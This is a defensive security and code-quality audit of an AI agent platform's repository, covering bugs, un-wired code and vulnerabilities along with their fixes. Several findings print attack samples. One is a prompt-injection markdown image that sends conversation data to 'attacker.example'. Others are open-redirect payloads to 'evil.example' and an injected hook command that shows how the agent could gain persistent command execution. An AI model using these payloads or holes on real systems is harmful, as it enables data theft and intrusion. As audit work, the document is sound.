# Full-repository audit — 2026-09-30

Audit of `Mubder/kazma` at `b06fece5` (live install on the same build,
`0e14e177` merge). Five categories, evidence-first. Every finding below was
verified in the code; the ones marked **reproduced** were also run.

**Method, stated plainly.** Every file was covered by automated whole-file
analysis; the security boundary and the code around every automated hit were
read by hand. Not every one of the 301,733 lines of product Python was read
line by line — the coverage table (appendix,
`AUDIT_FULL_2026-09-30_COVERAGE.md`) says, per file, which checks ran and
whether it was read.

- Automated, 100% of product code and scripts: ruff with 38 rule families
  (17,092 raw hits), bandit at every severity (1,119 hits, 0 high), and five
  AST/cross-reference scans written for this audit: the real app's route
  table (built under the test harness) against every client call, every name
  interpolated into SQL (198 sites), every logging call's arguments, closures
  capturing loop variables, and declared dependencies against imports.
- By hand: `kazma_ui/auth.py`, `routes_direct/auth.py`, `csrf.py`,
  `proxy_headers.py`, `security/web_sessions.py` in full; the markdown
  renderer; OAuth callbacks and their state stores; every file-serving and
  upload route; archive extraction; the only `shell=True`; the config-writing
  agent tool and both protected-key lists; the semantic cache.
- Each candidate was either reproduced, disproven by reproduction (two
  suspected issues were), or marked with its confidence.

## 1. Executive Summary

- **Overall health: Medium risk.** No finding is exploitable without either
  an authenticated session or a prompt injection, and the codebase is
  unusually well defended — default-deny API auth, fail-closed approval
  gates, 11,824 tests including dozens of class gates with negative controls.
  The largest open risk is that model output can make the browser send
  conversation data to an outside server, because the markdown renderer loads
  images from any host and no page sends a Content-Security-Policy; an opt-in
  cache feature is broken badly enough to replay a file deletion for an
  unrelated question.
- **Scope audited:** 921 product and script files, 375,595 lines — 793
  Python modules (301,733 lines), 48 JavaScript (39,096), 25 HTML templates
  (12,096), 3 CSS (7,327), and the scripts (Python, PowerShell, shell) — every
  one listed with its checks in the coverage table; 49 of them read by hand in
  full or in part. The 905 test files (214,842 lines) were scanned for stale
  references. Stack: Python 3.11/3.12, FastAPI/Starlette + uvicorn,
  LangGraph, Postgres (psycopg) and SQLite, Alpine.js front end, Textual TUI,
  Windows service via Task Scheduler.
- **Top 3 risks requiring immediate intervention:**
  1. **AUD-018** — data exfiltration through markdown images; no CSP (High).
  2. **AUD-001** — `KAZMA_SEMANTIC_CACHE=true` replays the first cached
     response and its tool calls for any later request (High; off by default
     and off on the live install).
  3. **AUD-019 / AUD-020** — open redirect after login, and a global login
     lockout any internet client can trigger (Medium).

Fixed in this audit's first change set (with regression tests, see §45 of
AGENTS.md and the CHANGELOG): AUD-018 (CSP + off-site images as links),
AUD-001 (semantic cache removed), AUD-019 (login `next` origin check),
AUD-020/002/003 (per-address+per-username login throttle, auth off the loop),
AUD-007 (one protected-config list covering `agent.hooks.`/`mcp.`, hooks with
no server secrets).

**Second change set (2026-09-30, gates in `tests/test_audit_full_backlog_2026_09_30.py`
plus the sibling suites):**
- Blocking I/O off the loop: AUD-004 (system-log tail from the end, in a
  thread), AUD-005 (skill-install validate + extract in a thread), AUD-006
  (Drive resumable upload above 5 MB, reads offloaded — was a multipart POST
  Google rejects for large files), AUD-008 (voice STT read bounded to 25 MB →
  413).
- Security hardening: AUD-021 (`0.0.0.0` dropped from the loopback-name set),
  AUD-022 (WS cookie auth requires a same-origin handshake — CSWSH; header
  credentials still fall through), AUD-023 (a session row is minted only for
  browser clients, not curl/CLI), AUD-024 (OAuth state logged as a short
  fingerprint, never the raw secret), AUD-025 (JSON in a `<script>` block is
  context-escaped via `json_for_script`), AUD-009 (voice extension allowlist),
  AUD-028 (migration PK identifiers quote-doubled).
- Dead code / wiring: AUD-013 (deleted the dead hub REST API **and** its
  server-side `badges.py` — the CLI `badge` command is a remote client),
  AUD-014 (removed the never-minted per-session WS token path), AUD-016
  (dropped unused `aiogram`/`tenacity` deps + the stale inventory rows),
  AUD-011 (declared `pydantic`/`langchain-core` — the two unconditional
  imports; the guarded-optional ones stay undeclared by design), AUD-010
  (load tests point at real routes: `/api/swarm/tasks/{id}`,
  `/api/chat/stream`, `/api/settings`; k6 too).

**Review of the second change set (same day)** found the fixes above had
gaps, now closed with their own gates:
- AUD-022 compared the Origin with the `Host` header only. Behind the live
  tunnel the forwarded Host depends on the proxy's configuration, and the
  install sits behind Cloudflare Access, so it could not be measured from
  outside; the check now also trusts the declared browser origins
  (`KAZMA_PUBLIC_URL`), the set CSRF and CORS use.
- AUD-025 fixed one instance of the class; `swarm.html` had another
  (`JSON.parse('{{ … | tojson }}')`), reproduced in node to throw on a quote,
  newline or backslash in a worker's task or logs. All templates are gated.
- AUD-009's neighbour: `voice.js` uploaded Safari's `audio/mp4` as
  `voice.webm`.
- AUD-010 fixed the five paths the audit listed; three more were dead
  (`/api/approve/pending`, `/api/approve/{id}/status`, `/ws/swarm/{id}`), every
  dispatch sent `prompt` (the route reads `task` → 400), and the HITL flows read
  keys no route returns. Fixed with one request-shape module and a route/body
  gate against the built app.
- The verification run itself took 1 h 22 min (`fast_test.py --chunks 4` with a
  fixed 900 s budget; a timeout killed only the venv launcher and fell back to
  serial per-file runs). The runner now kills whole process trees, bounds the
  drain, scales the budget with chunk size, and splits a timed-out chunk.

**AUD-015 done (third change set):** the route inventory is a gate
(`tests/test_api_route_callers.py`). With a caller detector that reads whole
string literals (balanced `${…}`, concatenation prefixes) and counts only
client code, 55 routes had no caller: each is now declared with a verified
reason, three dead ones were removed (the typing-telemetry stubs; and
`/api/system/flush`, which reset the model/worker/tool registry singletons
under live holders), and the Settings backup — which the page can create but
not restore — has a tested restore (`tests/test_settings_restore.py`).
Follow-up: a Restore control, once a restore keeps runtime state (active chat
threads, boot stamps) out.

**AUD-017 done (fourth change set):** 106 unused imports in product code → 0.
Each was first checked for a reader elsewhere (imports from the module, patch
strings, attribute access, skill manifests, which the native loader reads by
name): five were private helpers re-exported by `graph_builder` and imported
through it by `swarm/worker.py` and four tests — those now import from the
module that defines them. Four unused ones were more than clutter:
- `tool_builtins` defined `_qnorm` seven times after the package split and
  only `memory.py` calls it; the package re-exported the copy from
  `external.py`, so its one test exercised a dead copy. Six copies deleted,
  the test reads the live one.
- `graph_supervisor` imported the resets for the two ContextVars it binds and
  never called them. Correct, because LangGraph runs each node in a copy of
  the caller's context — now said at the site and held by
  `tests/test_node_context_scope.py` (with the leak as its negative control).
- `sse_chat` imported `is_shutting_down` unused: the check lives in
  `_streaming.py` (checked in history, nothing was lost).
- `hitl_supersede` had a dead `langgraph` availability check.
ERA001's 38 "commented-out code" hits are all comments that look like code
(sample payloads, section headers) — none removed. RUF100: 26 `noqa` markers
that suppressed nothing → 0 (their explanations kept as plain comments). Of
the 583 module-local public symbols, four were dead everywhere and are gone
(579; the rest are used in their own module or by tests — renaming them is the
sweep the ratchet's docstring declines, because skills reach code by name).
Found beside it: the Settings catalog defined the four provider capability
labels twice (2026-09-13 and 2026-09-28, different Arabic); Python kept the
second. The dead first set is gone and `tests/test_no_repeated_dict_keys.py`
makes a repeated literal key fail the build (ruff's F601 is only advisory in
CI).

**AUD-027 first pass (fifth change set):** silent handlers 538 → 476, blind
handlers 3,730 → 3,693. Triaged by consequence, not swept: every silent
handler around a WRITE was read. Found behind them:
- `KazmaAgent.sync_active_model` cleared `graph_builder._failover_clients`,
  which moved to `graph_supervisor` in the 2026-08-25 split — AttributeError on
  every model switch, swallowed, so a reconfigured provider stayed in failover
  until a restart. Now `graph_supervisor.reset_failover_cache()`, and
  `tests/test_module_attribute_refs.py` holds every `module_alias.attr` read to
  a name the module defines (it finds the old line; nothing else today).
- Eleven SQLite stores added columns by hand, most with `except Exception:
  pass` (a locked or read-only database left the column missing). One helper,
  `kazma_core.db.sqlite_columns`, and a gate that allows no other SQLite
  `ADD COLUMN`. The Postgres `pinned` migration's swallow could abort the
  schema transaction behind a "core schema ensured" line; it now reaches the
  pool's retry loop.
- The workspace router pinned the tools to `Path.cwd()/kazma-data/workspace`
  when the last workspace was deleted (a sibling of the bug
  `default_sandbox_root()` documents as removed); gate 9 of
  `tests/test_store_registry.py` now covers CWD + data-dir paths anywhere.
- The belief FTS rebuild reported success over a failed commit; the §25
  continue-directive clear, the cron purge, and backup pruning failed without
  a word (`tests/test_swallowed_errors_reported.py`).
The remaining silent handlers are best-effort cleanup (closing, cancelling,
UI refresh) and stay on the ratchet.

**AUD-026 done (sixth change set), differently than the finding proposed.**
Sharing per-message functions between the two routers presumed both
transports ran turns. They did not: the WebSocket's `send_prompt` /
`approve_tool` answered "sse_only" unless `KAZMA_WS_GRAPH=1`, and the chat
store's `sendPrompt` / `submitApproval` — the only code that sent them — had no
caller; stop / steer / abort were HTTP on the page and twins on the socket.
The "escape hatch" could not work even switched on. So the duplicate went
instead of being shared: the socket refuses the five actions naming their
routes (`_HTTP_ROUTE_FOR`) and keeps what the page uses (frames for watching
tabs, the cursor resume, the HITL card on connect, the orphan-clock clear).
`ws_chat.py` 2,910 → 486 lines; `create_ws_chat_router` 277 → 45 (ruff C901),
`chat_websocket` 187 → 22. The SSE router is the one transport (272 → 260;
two pure closures lifted out); it stays on a new ratchet,
`functions_over_complexity_50` (37 today, only down). Found on the way:
- Web Push never subscribed a browser: its only arming call was in the dead
  send path, and the push client spent its one try before the permission
  check (`tests/js/test_push_arming.js`, the old modules fail it).
- The `turn.timed_out` alert lived only in the dead path; it moved to
  `agent/turn.py`, beside the wall-clock budget. The web chat has no
  wall-clock budget — its turns are bounded by the step budget and tool
  timeouts, and `/long` missions run long on purpose — and that stays the
  owner's call.
- A socket frame that parsed as JSON but was not an object (`123`) ended the
  connection with a traceback.
Gate: `tests/test_ws_chat_is_telemetry_only.py`. Fifteen source locks that
described the removed copy were re-pointed, not deleted: each kept its SSE /
HTTP half, and its WebSocket half became "the socket runs no turn".

**AUD-029, found after the audit (seventh change set).** Reading the updater
for the deferred items: no Kazma package is published on PyPI (all eight
names answer 404), yet `kazma update` on a wheel install asked PyPI for the
newest version and had pip upgrade `kazma` by name, the Settings update check
read PyPI's `kazma`, and twelve hints sent readers to install `kazma[...]` or
`kazma-core[swarm]` by name. The live install (a git checkout) never took the
wheel path. Fixed: the updater installs the newest GitHub release's wheel only
when it matches the release's `SHA256SUMS` and GitHub's own digest (streamed,
size-capped, extras kept); Settings reads the same release, shows the real
version and says when it could not check; hints go through
`kazma_core.install_hint`. Gate: `tests/test_no_pypi_kazma.py` (every tracked
product, script and doc file, and every install argv by AST; it flags all 27
old sites, and each old form is a negative control).

Previously deferred: AUD-015 (annotate the ~18 API-only routes —
docs hygiene), AUD-017 (73-file unused-import sweep — its own batch), AUD-026
(split the two 270-complexity chat transports — touches the gated §31
delivery path, needs its own effort + full delivery matrix), AUD-027 (keep
lowering the exception ratchet, module by module). All four were taken the
same day (the change sets above); AUD-027 had its first pass and stays a
ratchet that only goes down, as does the new complexity count.

Resolved during the audit window (already deployed, `b06fece5`): the live
server ran below every normal program (Task Scheduler priority 7 — it started
at "CPU below normal, memory 2, I/O 1", its own log); the restart card
measured downtime at its send; Slack reconnects gave no reason; the test runner
starved the live server.

## 2. Detailed Audit Findings

### 🐛 1. Bugs & Functional Flaws

**[AUD-001] [Severity: High] [Confidence: High — reproduced] [kazma-core/kazma_core/llm_provider.py:827-851, kazma-core/kazma_core/swarm/semantic_cache.py:133-175]**

- **Evidence:**
  ```python
  # llm_provider.py:827-841
  cache_enabled = os.environ.get("KAZMA_SEMANTIC_CACHE", "false").lower() == "true"
  if cache_enabled:
      prompt_str = json.dumps(messages, sort_keys=True)
      cached_data = _semantic_cache_singleton.lookup(prompt_str, tools=tools)
      if cached_data is not None:
          tool_calls = [ToolCall(id=tc["id"], name=tc["name"], arguments=tc["arguments"])
                        for tc in cached_data.get("tool_calls", [])]
  ```
  Reproduced with the real encoder: after storing a turn "Delete the file
  notes/a.txt" (system prompt + that message) with a `file_delete` call, a
  lookup for "Delete the file notes/b.txt" **and** for "What is the weather
  in Kuwait tomorrow?" both HIT and returned `file_delete notes/a.txt`.
- **Root cause:** the cache key is the whole conversation, whose embedding is
  dominated by the shared system prompt (the embedder truncates long input),
  and a semantic match (≥ 0.95) replays the stored `tool_calls`.
- **Impact:** once enabled, every model call after the first returns the first
  cached answer and replays its tool calls — wrong answers everywhere; danger
  tools still stop at an approval card, write-tier tools execute. The inline
  comment warns only about cross-user leakage. Off by default; not enabled on
  the live install (no `semantic_cache.db`).
- **Remediation:** remove semantic replay: exact-hash lookup of the full
  request only, scoped per thread, never replaying `tool_calls` (or delete the
  feature); regression test with a stub encoder.

**[AUD-002] [Severity: Medium] [Confidence: High] [kazma-ui/kazma_ui/routes_direct/auth.py:150-154]**

- **Evidence:**
  ```python
  @self.app.post("/api/auth/login")
  async def _auth_login(request: Request) -> Response:
      ...
      if username and password:
          pu = authenticate_local_user(username, password)   # inline, on the loop
  ```
  `authenticate_local_user` reads the user store and runs PBKDF2-SHA256 at
  600,000 iterations (`security/platform_rbac.py:145, 173-187`) — measured
  **0.218 s** per check on the production machine.
- **Root cause:** a blocking helper called from `async def` without
  `asyncio.to_thread`, and absent from `_LOOP_STALL_HELPERS`
  (`tests/test_static_gates.py:890-917`), so the gate cannot see it.
- **Impact:** every login that names an existing local user freezes every
  chat stream ~0.2 s; within the throttle (10/IP, 200 global per 5 min) an
  attacker who knows a username stalls the loop ~40 s per 5 min. Only
  multi-user installs with local users (live: none).
- **Remediation:** `await asyncio.to_thread(authenticate_local_user, ...)`;
  add it to `_LOOP_STALL_HELPERS`.

**[AUD-003] [Severity: Low] [Confidence: High] [kazma-ui/kazma_ui/routes_direct/auth.py:309-313]**

- **Evidence:** `async def _auth_logout(...)`: `revoke_session(sid)` inline →
  `get_config_store().delete(key)` (`security/web_sessions.py:239`).
- **Impact:** one settings-store write on the event loop per logout.
- **Remediation:** `await asyncio.to_thread(revoke_session, sid)`; add
  `revoke_session` to the helper list.

**[AUD-004] [Severity: Low] [Confidence: High] [kazma-skills/kazma_skills/native/system_health_monitor/tools.py:139,175-176]**

- **Evidence:**
  ```python
  async def read_system_logs(lines: int = 100) -> str:
      with open(log_path, "r", encoding="utf-8", errors="replace") as f:
          all_lines = f.readlines()
  ```
- **Impact:** reads the whole day's log into memory on the loop to keep N
  lines; live logs are 4.6 MB/day (0.01 s), so negligible today, but it scales
  with log volume.
- **Remediation:** tail from the end (seek backwards) in `asyncio.to_thread`.

**[AUD-005] [Severity: Low] [Confidence: High] [kazma-core/kazma_core/agent_skills/installer.py:304-360]**

- **Evidence:** inside an `async` function: `with zip_path.open("wb") as fh:
  ... fh.write(chunk)` (up to 100 MB) and `zf.extractall(extract_dir)` (up to
  500 MB expanded).
- **Impact:** an approved skill install stalls the event loop while it writes
  and extracts.
- **Remediation:** write chunks and extract in `asyncio.to_thread`.

**[AUD-006] [Severity: Low] [Confidence: Medium] [kazma-core/kazma_core/backup/cloud_sync.py:351-353 (+7 siblings)]**

- **Evidence:** `with open(local, "rb") as f: resp = await client.post(_GDRIVE_UPLOAD_URL, params={"uploadType": "multipart"}, ...)`
- **Impact:** Google documents multipart upload for files of 5 MB or less;
  backup archives are larger. The file is also read synchronously during the
  async post. The live install backs up to R2, not Drive —
  `[Confidence: Medium] - NEEDS RUNTIME VERIFICATION` against Drive.
- **Remediation:** resumable upload for files over 5 MB, reading in a thread.

### 🕳️ 2. Architectural & Implementation Gaps

**[AUD-007] [Severity: Medium] [Confidence: High — reproduced] [kazma-core/kazma_core/agent/tool_builtins/system.py:125-130, kazma-core/kazma_core/safety/commitment/authorize.py:897-899, kazma-core/kazma_core/agent/tool_hooks.py:121-146, 250-272]**

- **Evidence:**
  ```python
  # tool_builtins/system.py:125 — config_save's own blocklist
  _BLOCKED_PREFIXES = ("security.", "kazma_secret", "vault.", "yolo.")
  # safety/commitment/authorize.py:897 — the commitment layer's list
  _CONFIG_PROTECTED_PREFIXES = ("safety.", "agent.commitment.", "notifications.lifecycle.")
  # tool_hooks.py:251 — hook commands (from agent.hooks.pre_tool / post_tool)
  return subprocess.run(command, input=stdin, ..., shell=True, cwd=cwd, ...)  # no env=
  ```
- **Root cause:** two lists for one purpose (what the agent may not change
  about itself); neither covers `agent.hooks.*` (commands run on every tool
  call) or `mcp.*` (server commands). Hook processes inherit the server's
  whole environment.
- **Impact:** reproduced that it is **currently inert**: `config_save` stores
  its `value: str` as a string and `load_hook_config` accepts only a list, so
  `'["echo PWNED"]'` loads no hook (a list value does). The protection is an
  incidental type mismatch the first "parse JSON in config_save" change
  removes — then one approval (none inside a YOLO window) gives persistent
  command execution with the vault key and database password in the
  environment, against AGENTS §26I. `safety.*` is writable through
  `config_save` whenever the commitment layer is off.
- **Remediation:** one protected-key list (single source) used by both,
  covering `safety.`, `agent.commitment.`, `agent.hooks.`, `mcp.`,
  `notifications.lifecycle.`, `security.`, `vault.`, `yolo.`,
  `kazma_secret`; run hooks with `tool_child_env()`; gate test that every
  config key naming a command is protected.

**[AUD-008] [Severity: Low] [Confidence: High] [kazma-ui/kazma_ui/routes_voice.py:65]**

- **Evidence:** `audio_bytes = await file.read()` — no bound; the sibling
  chat upload reads `MAX_UPLOAD_BYTES + 1` and returns 413
  (`routes_chat_upload.py:84-91`).
- **Impact:** an authenticated client can exhaust memory with one upload
  (rate limit 30/min).
- **Remediation:** bounded read like the chat upload (STT providers cap ~25 MB).

**[AUD-009] [Severity: Low] [Confidence: High — traversal disproven] [kazma-ui/kazma_ui/routes_voice.py:71, kazma-core/kazma_core/voice/stt.py:680-681]**

- **Evidence:** `ext = file.filename.rsplit(".", 1)[-1]` →
  `tempfile.NamedTemporaryFile(suffix=f".{ext}", delete=False)`.
- **Impact:** none today — reproduced that `rsplit(".", 1)` always cuts inside
  the last `..`, so a traversal suffix fails (`FileNotFoundError`); absolute
  and UNC forms fail the same way. The safety is incidental.
- **Remediation:** validate `ext` against an audio allowlist.

**[AUD-010] [Severity: Low] [Confidence: High] [loadtests/locustfile_swarm.py:63,121,201,228,261; loadtests/locustfile_websocket.py:54]**

- **Evidence:** `self.client.post("/api/session/create", ...)`,
  `f"/api/swarm/status/{self.last_task_id}"`,
  `f"/api/swarm/stream/{self.thread_id}"`, `"/api/chat"`, `"/api/config"` —
  none is a route of the app (route table of the built app, 521 routes).
- **Impact:** the load tests measure 404s.
- **Remediation:** point them at `/api/chat/stream`, `/api/swarm/*` routes
  that exist, or delete them.

**[AUD-011] [Severity: Low] [Confidence: High] [pyproject.toml and product imports]**

- **Evidence:** imported directly, declared nowhere: `pydantic` (19 files),
  `numpy` (5), `jsonschema` (`swarm/reliability.py`), `langchain_core`
  (`kazma_gateway/stores/checkpoint.py`), `huggingface_hub`
  (`memory/embedder.py`), `aiohttp` (`mcp/oauth.py`).
- **Impact:** they work only as other packages' dependencies.
- **Remediation:** declare the module-level ones.

**[AUD-012] [Severity: Medium] [Confidence: High] [operational — Slack app token]**

- **Evidence:** live log 2026-09-30 03:13:51:
  `[Slack] Socket Mode handshake confirmed (host applink-14; connections open for this app: 9)`
  — the first boot with the handshake logging shipped today. The process has
  one Slack adapter; no other install booted against the settings store in 14
  days; no second Kazma process or container on the machine.
- **Impact:** Slack hands each event to ONE of the app's connections, so this
  Kazma can miss Slack messages; the 10-connection cap likely explains the
  boot-time reconnect storms (10 in 30 s at 00:07).
- **Remediation (owner):** find what else uses the app-level token, or
  regenerate it (Slack app → Basic Information → App-Level Tokens) and paste
  the new one; the next boot's handshake line should say 1.

### 🔌 3. Un-wired Components

**[AUD-013] [Severity: Low] [Confidence: High] [kazma-core/kazma_core/hub/api.py:219-407]**

- **Evidence:** a standalone FastAPI `app` with 8 routes (`/api/v1/skills`,
  `/download`, `/submit`, ...), imported only by `tests/test_hub_api.py` and
  `tests/test_hub_e2e.py`; `tests/test_orphan_modules.py:39-42` allowlists it:
  "kept as a tested library when its broken Kubernetes deployment was removed
  (2026-09-23); nothing runs it."
- **Remediation:** delete it (and its tests), or give it an entry point.

**[AUD-014] [Severity: Low] [Confidence: High] [kazma-ui/kazma_ui/auth.py:839-876, 996-1009, 936-937]**

- **Evidence:** `generate_ws_session_token()` has no caller (`git grep`: its
  definition only); `_ws_session_tokens` stays empty, so the `?token=` branch
  of `websocket_is_authenticated` can never succeed, while its docstring
  lists it as a credential path.
- **Remediation:** remove the mint/verify pair and the query branch.

**[AUD-015] [Severity: Low] [Confidence: Medium] [REST routes with no client]**

- **Evidence:** of 457 served `/api` routes, these have no caller in any
  template, script or Python client (verified by fragment search, dynamic
  URLs excluded): documents `generate`, `import`, `merge`, `search`,
  `{id}/artifacts`, `{id}/fill-form`, `{id}/versions`, `ops/retention`;
  `email/presets`, `email/protocol/disconnect`; `github/branches`;
  `ide/codebase`, `ide/list`, checkpoints `{id}/review`; `voice/status`;
  `workspace/recent`, `workspace/select`, `workspace/tree`;
  `webhooks/telegram/health`.
- **Impact:** API-only by design for some (agent tools use the services
  directly), un-wired for others; AGENTS' UI rule is "what the owner can
  change has a control".
- **Remediation:** mark each API-only with a reason, or add the control.

### 👻 4. Dead Code & Obsolete Assets [Recommendation: Remove/Refactor]

**[AUD-016] [Severity: Low] [Confidence: High] [pyproject.toml:23,32; kazma-ui/kazma_ui/routes_direct/system.py:629-658]**

- **Evidence:** `"aiogram>=3.0.0"` and `"tenacity>=8.0.0"` are MAIN
  dependencies no product module imports (references are comments:
  `telegram.py:4` "no aiogram Dispatcher", `retry.py:6` "tenacity decorators
  ... anymore"); the Settings package list describes them as in use.
- **Remediation:** remove both; drop them from the inventory.

**[AUD-017] [Severity: Low] [Confidence: High] [73 files]**

- **Evidence:** 115 unused imports (F401; most in `swarm/engine.py` 9,
  `agent/graph_builder.py` 6, `kazma_gateway/mcp_server.py` 6), 39
  commented-out code blocks (ERA001; `proxy/client.py` 7), 33 `noqa`
  markers that suppress nothing (RUF100), 594 public top-level symbols no
  other file names (ratcheted in `tests/test_debt_ratchet.py`). No undefined
  names (F821) and no redefinitions (F811).
- **Remediation:** remove (re-exports kept with `__all__`); lower the
  ratchet baseline in the same change.

### ⚠️ 5. Weaknesses & Technical Debt

**[AUD-018] [Severity: High] [Confidence: High] [Category: Security] [kazma-ui/kazma_ui/static/js/streaming.js:685-689; every page response]**

- **Evidence:**
  ```javascript
  html = html.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, function(_, alt, url) {
    var decodedUrl = url.replace(/&amp;/g, '&');
    if (/^(https?:\/\/|\/)/i.test(decodedUrl)) {
      return '<img src="' + esc(decodedUrl) + '" alt="' + esc(alt) + '" loading="lazy" class="md-img">';
  ```
  No Content-Security-Policy anywhere but one download response
  (`routes_chat_upload.py:116`); `curl -D - http://127.0.0.1:9090/login` on
  the live install: no CSP, X-Frame-Options, Referrer-Policy or nosniff.
- **Root cause:** model output (steerable by any untrusted input the agent
  reads — web pages, email, documents, MCP results) is rendered with images
  from any host, and the browser has no policy restricting them.
- **Exploit:** a prompt injection makes the reply contain
  `![](https://attacker.example/c?d=<conversation data>)`; the browser
  fetches it when the reply renders (with a Referer naming the page).
  OWASP LLM02 / CWE-200.
- **Remediation:** page CSP (`default-src 'self'; img-src 'self' data: blob:;
  frame-ancestors 'none'`, script/style sources as the pages need) plus
  `X-Content-Type-Options: nosniff` and `Referrer-Policy: same-origin`;
  render external images as links (or through an allowlisted proxy route).

**[AUD-019] [Severity: Medium] [Confidence: High — reproduced] [Category: Security] [kazma-ui/kazma_ui/templates/login.html:144-145, 183]**

- **Evidence:**
  ```javascript
  var next = params.get('next') || '/';
  if (!next.startsWith('/') || next.startsWith('//')) next = '/';
  ...
  window.location.href = next;
  ```
  Reproduced with the WHATWG URL parser: `/\evil.example`,
  `/\/evil.example` and `/<TAB>/evil.example` pass the check and resolve to
  `https://evil.example/`.
- **Impact:** CWE-601: a link to the real login page lands the freshly
  signed-in user on a look-alike site.
- **Remediation:** `const u = new URL(next, location.origin); next = (u.origin === location.origin) ? u.pathname + u.search + u.hash : '/';` + a JS test over these cases.

**[AUD-020] [Severity: Medium] [Confidence: High] [Category: Security/Availability] [kazma-ui/kazma_ui/routes_direct/auth.py:87-88, 118-126]**

- **Evidence:**
  ```python
  _login_failures_global: list[float] = []
  _LOGIN_MAX_FAILS_GLOBAL = 200
  ...
  if (len(recent) >= _LOGIN_MAX_FAILS
          or len(_login_failures_global) >= _LOGIN_MAX_FAILS_GLOBAL):
      return _JSONResponse({"detail": "Too many failed login attempts — try again later"}, status_code=429)
  ```
- **Impact:** 200 failures in 5 minutes from any addresses lock out every
  login, the owner's included; behind a declared proxy the key is the real
  visitor address, so ≥ 20 addresses (one IPv6 /64) renew it indefinitely,
  and loopback auto-login is off behind a proxy.
- **Remediation:** replace the global cap with per-account backoff (failures
  against unknown usernames never lock a known one), keep per-address limits.

**[AUD-021] [Severity: Low] [Confidence: High] [Category: Security] [kazma-ui/kazma_ui/auth.py:503]**

- **Evidence:** `local_names = {"localhost", "127.0.0.1", "::1", "[::1]", "0.0.0.0"}`
- **Impact:** browsers route `0.0.0.0` to the loopback; on a direct bind with
  peer trust, a request to `http://0.0.0.0:<port>` gets the loopback
  auto-login. Mitigated by the CSRF middleware, SameSite=Lax and current
  browsers; the live install is behind a declared proxy.
- **Remediation:** drop `0.0.0.0`.

**[AUD-022] [Severity: Low] [Confidence: Medium] [Category: Security] [kazma-ui/kazma_ui/auth.py:944-946, 1011-1033]**

- **Evidence:** the WebSocket Origin check guards only the credential-less
  loopback path; "If the Origin check fails, credential paths below are
  still tried".
- **Impact:** cookie-authenticated handshakes rely on SameSite=Lax alone
  against cross-site WebSocket hijacking.
- **Remediation:** apply `_ws_origin_allowed` to cookie-authenticated
  handshakes too.

**[AUD-023] [Severity: Low] [Confidence: High] [Category: Performance] [kazma-ui/kazma_ui/auth.py:1369-1372]**

- **Evidence:** after a request authenticated by `X-Kazma-Secret`,
  `_mint_auth_cookie(...)` → `create_session(actor="auto-cookie", role="admin")`
  (`web_sessions.py:143`: a settings row, 14-day TTL, one INFO line).
- **Impact:** a cookie-less client (curl, scripts, CLI) mints one admin
  session row per request; the live install mints 0-3 a day.
- **Remediation:** mint only for browser requests.

**[AUD-024] [Severity: Low] [Confidence: High] [Category: Security] [kazma-gateway/kazma_gateway/routers/github.py:561]**

- **Evidence:** `logger.warning("[github/oauth] state mismatch — possible CSRF (got=%s expected=%s)", state, expected_state)`
- **Impact:** a failed attempt writes the pending anti-CSRF value to the log,
  which the agent can read with its log tool.
- **Remediation:** log neither value (or a short hash).

**[AUD-025] [Severity: Low] [Confidence: High] [Category: Security] [kazma-ui/kazma_ui/app.py:655, templates/base.html:174]**

- **Evidence:** `_translations_json = _json.dumps(TRANSLATIONS, ensure_ascii=False)` rendered as `window.KAZMA_I18N = {{ translations_json|safe }};`
- **Impact:** a catalog string containing `</script` would end the script
  early; none does (developer text).
- **Remediation:** escape `<` as `<` when embedding JSON in a script.

**[AUD-026] [Severity: Low] [Confidence: High] [Category: Maintainability] [kazma-ui/kazma_ui/routes/ws_chat.py:351, kazma-ui/kazma_ui/sse_chat/__init__.py:167, ...]**

- **Evidence:** 580 functions exceed cyclomatic complexity 10; 33 exceed 50:
  `create_ws_chat_router` 277, `create_sse_chat_router` 272,
  `create_graph_handler` 225 (`kazma_gateway/agent_handler/graph.py:547`),
  `supervisor_node` 218 (`agent/graph_supervisor.py:68`),
  `_build_general_routes` 191 (`settings.py:249`).
- **Remediation:** extract the two chat transports' message handling into
  per-message functions shared by both (they are the same protocol).

**[AUD-027] [Severity: Low] [Confidence: High] [Category: Maintainability] [repository-wide]**

- **Evidence:** 3,103 `except Exception` handlers (BLE001) and 559
  `try/except/pass` (S110); both counts are ratcheted
  (`tests/test_debt_ratchet.py`) so they only go down.
- **Remediation:** keep lowering the baseline, module by module.

**[AUD-028] [Severity: Info] [Confidence: High] [Category: Security] [kazma-core/kazma_core/migration/path_rewrite.py:252]**

- **Evidence:** `select_pk = ", ".join(f'"{c}"' for c in pk_cols)` —
  primary-key names from the imported bundle's own schema, `"` not doubled.
- **Impact:** a malformed SELECT on the staging copy of an operator-imported
  bundle (sqlite3 runs one statement).
- **Remediation:** quote identifiers by doubling `"`.

**[AUD-029] [Severity: High] [Confidence: High — every name answers 404 on PyPI] [Category: Security/Supply chain] [kazma-cli/kazma_cli/update.py:58, 286-330, 427-446; kazma-core/kazma_core/settings_manager.py:1253-1281; 12 hints in code and docs]**

- **Evidence:** `PYPI_URL = "https://pypi.org/pypi/kazma/json"`; `do_pip_update`
  ran `_run_pip(["install", "--upgrade", PACKAGE_NAME])`; `check_updates` read
  the same URL and reported `kazma_core.__version__` (absent, so "0.5.0");
  hints such as `pip install 'kazma[web]'` (read_url, knowledge ingest, e2b,
  durable, eight docs pages) and `pip install kazma-core[swarm]` (swarm page;
  no such extra). `kazma`, `kazma-core`, `-ui`, `-cli`, `-gateway`, `-skills`,
  `-tui`, `-memory`: HTTP 404 from `pypi.org/pypi/<name>/json`, 2026-09-30.
- **Impact:** anyone who registers `kazma` on PyPI runs code on every wheel
  install that runs `kazma update`, and on anyone who follows a hint in an
  environment where Kazma is not installed; the Settings page would show their
  version as an available update.
- **Remediation (done):** see the seventh change set above.

**Audited and cleared (no finding with high confidence):**

- SQL injection — all 198 bandit B608 sites; every interpolated expression
  extracted by AST: placeholders, constant clauses, sanitized or validated
  identifiers (e.g. `memory/backends.py:322, 667`,
  `migration/path_rewrite.py:234`, `documents/audit.py:375-398`).
- Archive extraction — `zipfile` strips `..` and absolute members; the skill
  installer caps download, members, size and ratio and refuses symlinks
  (`agent_skills/installer.py:283-360`).
- Deserialization — no `yaml.load`, `pickle`, `marshal`, `shelve`; `exec`
  only in the Python sandbox runner (`tools/code_exec.py:131`).
- Loop-variable closures — all 22 B023 sites run within their iteration.
- File-serving routes — `research_panel/routes.py:128-177, 788-817`
  (containment on resolved paths); backup download is admin-only.
- CSRF — no mutating HTTP route outside `/api/`; the middleware covers it.
- OAuth state — random, single use, expiring
